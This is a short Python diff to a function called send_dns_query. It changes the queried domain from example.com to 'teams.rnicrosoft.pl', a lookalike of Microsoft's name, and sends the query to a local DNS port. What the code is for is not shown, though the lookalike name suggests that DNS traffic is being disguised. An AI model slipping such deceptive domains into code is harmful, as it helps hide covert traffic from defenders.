@@ -20,7 +20,7 @@ def send_dns_query(data):
         # Zapytanie DNS
         query = DNSRecord(
             DNSHeader(id=txid),
-            q=DNSQuestion("example.com", QTYPE.A)
+            q=DNSQuestion("teams.rnicrosoft.pl", QTYPE.A)
         )
         
         client.sendto(query.pack(), ('127.0.0.1', 5353))
